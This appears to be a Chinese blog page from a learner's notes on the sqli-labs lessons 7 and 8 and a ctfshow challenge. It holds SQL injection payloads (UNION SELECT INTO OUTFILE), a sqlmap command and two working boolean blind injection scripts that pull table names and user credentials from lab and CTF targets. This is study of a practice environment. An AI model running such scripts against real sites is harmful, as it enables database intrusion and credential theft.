@@ -1,0 +1,645 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.jpg">
+  <link rel="icon" href="/img/logo.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="aidemofashi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="修正sql-labs-less7错误实现了win下phpstudy部署sqli，自己做了一遍less7，发现了select和union select的问题，上次我以为有了文件写入后不需要union了，后来发现并不是这样，没了union会失败问了kimi    为什么?id&#x3D;-1’)) union select 1,2,table_name from information_schema.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="note-05">
+<meta property="og:url" content="https://aidemofashi.github.io/2025/03/04/note-05/index.html">
+<meta property="og:site_name" content="aidemofashi&#39;s blog">
+<meta property="og:description" content="修正sql-labs-less7错误实现了win下phpstudy部署sqli，自己做了一遍less7，发现了select和union select的问题，上次我以为有了文件写入后不需要union了，后来发现并不是这样，没了union会失败问了kimi    为什么?id&#x3D;-1’)) union select 1,2,table_name from information_schema.">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-03-04T13:17:54.000Z">
+<meta property="article:modified_time" content="2025-03-04T15:23:45.336Z">
+<meta property="article:author" content="aidemofashi">
+<meta property="article:tag" content="sql-labs">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>note-05 - aidemofashi&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"aidemofashi.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>aidemofashi&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="http://39.105.15.250/aidemofashi_home/index.html" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/main.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="note-05"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-04 21:17" pubdate>
+          2025年3月4日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          11 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">note-05</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="修正sql-labs-less7错误"><a href="#修正sql-labs-less7错误" class="headerlink" title="修正sql-labs-less7错误"></a>修正sql-labs-less7错误</h1><p>实现了win下phpstudy部署sqli，自己做了一遍less7，发现了select和union select的问题，<br>上次我以为有了文件写入后不需要union了，后来发现并不是这样，没了union会失败<br>问了kimi  </p>
+<blockquote>
+<p>为什么<br>?id&#x3D;-1’)) union select 1,2,table_name from information_schema.tables where table_schema&#x3D;’security’ into outfile”D:\phpstudy_pro\WWW\sqli-labs\Less-7\4.txt”–+<br>而<br>?id&#x3D;-1’)) select table_name from information_schema.tables where table_schema&#x3D;’security’ into outfile”D:\phpstudy_pro\WWW\sqli-labs\Less-7\4.txt”–+<br>不生效  </p>
+</blockquote>
+<p>KIMI:</p>
+<blockquote>
+<p><em><strong>为什么UNION SELECT是关键？</strong></em><br>UNION SELECT的作用是把两个查询的结果合并在一起，而不是直接替换原始查询。它要求两个查询的列数和数据类型匹配，但只要满足这些条件，就能让注入的语句与原始查询兼容。而直接的SELECT语句没有这种兼容性，直接破坏了原始查询的结构，导致语法错误。<br><em><strong>数据库的执行逻辑决定了这一切</strong></em><br>数据库在解析SQL语句时，会严格按照语法规则执行。如果注入的语句破坏了原始查询的结构，数据库会报错。这种报错可能不会直接显示给用户，但会导致注入失败。第一个语句通过UNION SELECT与原始查询兼容，所以能成功；第二个语句直接破坏了原始查询的语法，所以失败。<br><em><strong>权限和路径不是问题</strong></em><br>INTO OUTFILE操作需要数据库户具有FILE权限，而且目标路径必须有效。但既然第一个语句已经成功，说明权限和路径都没有问题。第二个语句失败的原因完全在于语法错误，而不是权限或路径。  </p>
+</blockquote>
+<p>原来联合注入漏洞叫<em><strong>联合</strong></em>是这个原理</p>
+<h1 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h1><p>该题测试没有报错回显，只有登录是否成功回显<br>只能用盲注了，<br>sqlmap或上次less5的脚本都行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sqlmap">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&quot; --batch --dbs<br><br>--batch表示碰到选择时选用默认选项，--dbs表示爬取所有数据库名<br>-D  库名 --tables表示爬取某数据库下的所有表<br>-D 库名 -T 表名--columns表示爬取某库下某表的所有列<br></code></pre></td></tr></table></figure>
+
+<p>less5脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>TARGET_URL = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-8/&quot;</span> <br>TRUE_STRING = <span class="hljs-string">&quot;You are in...........&quot;</span> <br>CHARSET = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@$!&quot;</span> <br>HEADERS = &#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3&quot;</span><br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_payload</span>(<span class="hljs-params">payload</span>):<br>    url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;TARGET_URL&#125;</span>?id=1&#x27; AND <span class="hljs-subst">&#123;payload&#125;</span> --+&quot;</span><br>    response = requests.get(url, headers=HEADERS)<br>    <span class="hljs-keyword">return</span> response.text<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_length</span>(<span class="hljs-params">query</span>):<br>    length = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">f&quot;LENGTH(<span class="hljs-subst">&#123;query&#125;</span>)=<span class="hljs-subst">&#123;length&#125;</span>&quot;</span><br>        response = send_payload(payload)<br>        <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 长度为: <span class="hljs-subst">&#123;length&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> length<br>        length += <span class="hljs-number">1</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_string</span>(<span class="hljs-params">query, length</span>):<br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length + <span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 获取第 <span class="hljs-subst">&#123;i&#125;</span> 个字符...&quot;</span>)<br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> CHARSET:<br>            payload = <span class="hljs-string">f&quot;SUBSTR(<span class="hljs-subst">&#123;query&#125;</span>,<span class="hljs-subst">&#123;i&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;&quot;</span><br>            response = send_payload(payload)<br>            <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>                result += char<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 当前结果: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    db_length = get_length(<span class="hljs-string">&quot;DATABASE()&quot;</span>)<br>    db_name = get_string(<span class="hljs-string">&quot;DATABASE()&quot;</span>, db_length)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 数据库名: <span class="hljs-subst">&#123;db_name&#125;</span>&quot;</span>)<br><br>    table_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">f&quot;(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())=<span class="hljs-subst">&#123;table_count&#125;</span>&quot;</span><br>        response = send_payload(payload)<br>        <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-keyword">break</span><br>        table_count += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 表数量: <span class="hljs-subst">&#123;table_count&#125;</span>&quot;</span>)<br><br>    table_names = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(table_count):<br>        tbl_length = get_length(<span class="hljs-string">f&quot;(SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>)<br>        tbl_name = get_string(<span class="hljs-string">f&quot;(SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>, tbl_length)<br>        table_names.append(tbl_name)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 表名: <span class="hljs-subst">&#123;tbl_name&#125;</span>&quot;</span>)<br><br>    target_table = <span class="hljs-string">&quot;users&quot;</span> <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 获取<span class="hljs-subst">&#123;target_table&#125;</span>表的字段...&quot;</span>)<br>    field_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">f&quot;(SELECT COUNT(*) FROM information_schema.columns WHERE table_name=&#x27;<span class="hljs-subst">&#123;target_table&#125;</span>&#x27; AND table_schema=DATABASE())=<span class="hljs-subst">&#123;field_count&#125;</span>&quot;</span><br>        response = send_payload(payload)<br>        <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-keyword">break</span><br>        field_count += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 字段数量: <span class="hljs-subst">&#123;field_count&#125;</span>&quot;</span>)<br><br>    field_names = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(field_count):<br>        fld_length = get_length(<span class="hljs-string">f&quot;(SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#x27;<span class="hljs-subst">&#123;target_table&#125;</span>&#x27; AND table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>)<br>        fld_name = get_string(<span class="hljs-string">f&quot;(SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#x27;<span class="hljs-subst">&#123;target_table&#125;</span>&#x27; AND table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>, fld_length)<br>        field_names.append(fld_name)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 字段名: <span class="hljs-subst">&#123;fld_name&#125;</span>&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 获取<span class="hljs-subst">&#123;target_table&#125;</span>表的数据...&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(field_count):<br>        <span class="hljs-keyword">if</span> field_names[i] <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>]:  <br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 获取字段: <span class="hljs-subst">&#123;field_names[i]&#125;</span>&quot;</span>)<br>            data_count = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                payload = <span class="hljs-string">f&quot;(SELECT COUNT(*) FROM <span class="hljs-subst">&#123;target_table&#125;</span>)=<span class="hljs-subst">&#123;data_count&#125;</span>&quot;</span><br>                response = send_payload(payload)<br>                <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>                    <span class="hljs-keyword">break</span><br>                data_count += <span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 数据条数: <span class="hljs-subst">&#123;data_count&#125;</span>&quot;</span>)<br><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(data_count):<br>                data_length = get_length(<span class="hljs-string">f&quot;(SELECT <span class="hljs-subst">&#123;field_names[i]&#125;</span> FROM <span class="hljs-subst">&#123;target_table&#125;</span> LIMIT <span class="hljs-subst">&#123;j&#125;</span>,1)&quot;</span>)<br>                data = get_string(<span class="hljs-string">f&quot;(SELECT <span class="hljs-subst">&#123;field_names[i]&#125;</span> FROM <span class="hljs-subst">&#123;target_table&#125;</span> LIMIT <span class="hljs-subst">&#123;j&#125;</span>,1)&quot;</span>, data_length)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 数据[<span class="hljs-subst">&#123;j+<span class="hljs-number">1</span>&#125;</span>]: <span class="hljs-subst">&#123;data&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+
+<p>顺便学习一下ctfshow web8 的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <br>url = <span class="hljs-string">&#x27;http://53aab0c2-b451-4910-a1e0-f15fd9e64b2a.challenge.ctf.show:8080/index.php?id=-1/**/or/**/&#x27;</span><br>name = <span class="hljs-string">&#x27;&#x27;</span><br> <br><span class="hljs-comment"># 循环45次( 循环次数按照返回的字符串长度自定义)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">45</span>):<br>    <span class="hljs-comment"># 获取当前使用的数据库</span><br>    <span class="hljs-comment"># payload = &#x27;ascii(substr(database()from/**/%d/**/for/**/1))=%d&#x27;</span><br>    <span class="hljs-comment"># 获取当前数据库的所有表</span><br>    <span class="hljs-comment"># payload = &#x27;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%d/**/for/**/1))=%d&#x27;</span><br>    <span class="hljs-comment"># 获取flag表的字段</span><br>    <span class="hljs-comment"># payload = &#x27;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%d/**/for/**/1))=%d&#x27;</span><br>    <span class="hljs-comment"># 获取flag表的数据</span><br>    payload = <span class="hljs-string">&#x27;ascii(substr((select/**/flag/**/from/**/flag)from/**/%d/**/for/**/1))=%d&#x27;</span><br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在获取第 %d 个字符&#x27;</span> % i)<br>    <span class="hljs-comment"># 截取SQL查询结果的每个字符, 并判断字符内容</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>, <span class="hljs-number">128</span>):<br>        result = requests.get(url + payload % (i, j))<br> <br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;If&#x27;</span> <span class="hljs-keyword">in</span> result.text:<br>            name += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;数据库名/表名/字段名/数据: %s&#x27;</span> % name)<br>            <span class="hljs-keyword">break</span><br> <br>        <span class="hljs-comment"># 如果某个字符不存在,则停止程序</span><br>        count += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> count &gt;= (<span class="hljs-number">128</span> - <span class="hljs-number">31</span>):<br>            exit()<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/120115458">https://blog.csdn.net/wangyuxiang946/article/details/120115458</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/sql-labs/" class="print-no-link">#sql-labs</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>note-05</div>
+      <div>https://aidemofashi.github.io/2025/03/04/note-05/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>aidemofashi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/03/05/note-06/" title="note-06">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">note-06</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/03/02/note-04/" title="note-04">
+                        <span class="hidden-mobile">note-04</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
